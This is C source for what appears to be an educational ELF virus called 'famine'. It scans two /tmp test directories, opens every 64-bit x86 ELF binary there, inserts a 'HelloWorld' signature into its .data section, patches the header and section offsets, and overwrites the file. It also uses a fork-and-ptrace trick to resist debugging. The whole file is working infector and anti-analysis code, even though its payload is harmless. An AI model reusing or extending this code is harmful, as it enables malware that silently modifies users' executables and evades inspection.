#include "famine.h"
const char *payload = "HelloWorld";

static void updateOffsets(Elf64_Ehdr *header, size_t offset, size_t toAdd) {
    size_t      i;
    Elf64_Shdr  *section;
    Elf64_Phdr  *program;

    if (header->e_entry > offset)
      header->e_entry += toAdd;
    if (header->e_phoff > offset)
      header->e_phoff += toAdd;
    if (header->e_shoff > offset)
      header->e_shoff += toAdd;
    i = 0;
    while (i < header->e_shnum) {
        section = (void *)(header) + header->e_shoff + i * sizeof(Elf64_Shdr);
        if (section->sh_offset > offset)
            section->sh_offset += toAdd;
        i += 1;
    }
    i = 0;
    while (i < header->e_phnum) {
        program = ((void *)header) + header->e_phoff + i * sizeof(Elf64_Phdr);
        if (program->p_offset > offset)
            program->p_offset += toAdd;
        if (program->p_paddr > offset)
            program->p_paddr += toAdd;
        i += 1;
    }
}

static int  mapFile(const char *dirname, const char *filename, struct bfile *file) {
  int         fd;
  char        *tmp;
  struct stat stats;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, "/");
  strcat(tmp, filename);
  if ((fd = open(tmp, O_RDWR)) == -1) {
    free(tmp);
    return (-1);
  }
  free(tmp);
  if (fstat(fd, &stats) == -1) {
    close(fd);
    return (-1);
  }
  file->size = stats.st_size;
  if ((file->header = mmap(NULL, file->size + strlen(payload) + 1, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED) {
    close(fd);
    return (-1);
  }
  close(fd);
  return (0);
}

static int  isCompatible(unsigned char e_ident[EI_NIDENT], Elf64_Half e_machine) {
  return (e_ident[EI_MAG0] == ELFMAG0 &&
          e_ident[EI_MAG1] == ELFMAG1 &&
          e_ident[EI_MAG2] == ELFMAG2 &&
          e_ident[EI_MAG3] == ELFMAG3 &&
          e_machine == EM_X86_64);
}

static Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
  Elf64_Shdr  *pointer;
  Elf64_Shdr  *shstrHeader;

  pointer = ((void *)header) + header->e_shoff;
  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, ".data") != 0)
    pointer += 1;
  return (pointer);
}

static int  writeToFile(const char *dirname, const char *filename, struct bfile header) {
  int   fd;
  char  *tmp;

  if ((tmp = malloc(strlen(dirname) + strlen(filename) + 2)) == NULL)
    return (-1);
  strcpy(tmp, dirname);
  strcat(tmp, "/");
  strcat(tmp, filename);
  if ((fd = open(tmp, O_WRONLY)) == -1) {
    free(tmp);
    return (-1);
  }
  free(tmp);
  write(fd, header.header, header.size);
  close(fd);
  return (0);
}

static int  appendSignature(struct bfile file, size_t offset) {
  size_t  i;
  void    *tmp;
  size_t  toAdd;
  size_t  total;

  i = file.size - 1;
  tmp = file.header;
  toAdd = strlen(payload) + 1;
  total = file.size - offset;
  memmove(tmp + i + toAdd - total, tmp + i - total, total);
  i -= total - 1;
  memcpy(tmp + i, payload, toAdd);
  return (0);
}

static int  infectFile(const char *dirname, struct dirent *file) {
  Elf64_Shdr    *data;
  struct bfile  header;
  size_t        offset;

  if (mapFile(dirname, file->d_name, &header) == -1)
    return (0);
  if ((size_t)(header.size) < sizeof(Elf64_Ehdr) || !isCompatible(header.header->e_ident, header.header->e_machine))
    return (0);
  data = getDataSectionHeader(header.header);
  data->sh_size += strlen(payload) + 1;
  offset = data->sh_offset;
  appendSignature(header, offset + data->sh_size - strlen(payload) - 1);
  header.size += strlen(payload) + 1;
  updateOffsets(header.header, offset, strlen(payload) + 1);
  writeToFile(dirname, file->d_name, header);
  return (0);
}

static int  infectBins(const char *dirname) {
  DIR *dir;
  struct dirent *file;

  if ((dir = opendir(dirname)) == NULL)
    return (-1);
  while ((file = readdir(dir)) != NULL) {
    if (infectFile(dirname, file) == -1) {
      closedir(dir);
      return (-1);
    }
  }
  closedir(dir);
  return (0);
}

static int  preventDebug(void) {
  pid_t   pid;

  if ((pid = fork()) == -1)
    return (-1);
  if (pid == 0) {
    if (waitpid(pid, NULL, 1) == -1)
      return (-1);
    exit(0);
  }
  if (ptrace(PT_TRACE_ME, 0, 0, 0) == -1)
    return (-1);
  return (0);
}

int   main(void) {
  size_t  i;
  char    *infectDir[3] = {"/tmp/test", "/tmp/test2", NULL};

  if (preventDebug() == -1)
    return (1);
  i = 0;
  while (infectDir[i] != NULL) {
    if (infectBins(infectDir[i]) == -1)
      return (1);
    i += 1;
  }
  return (0);
}
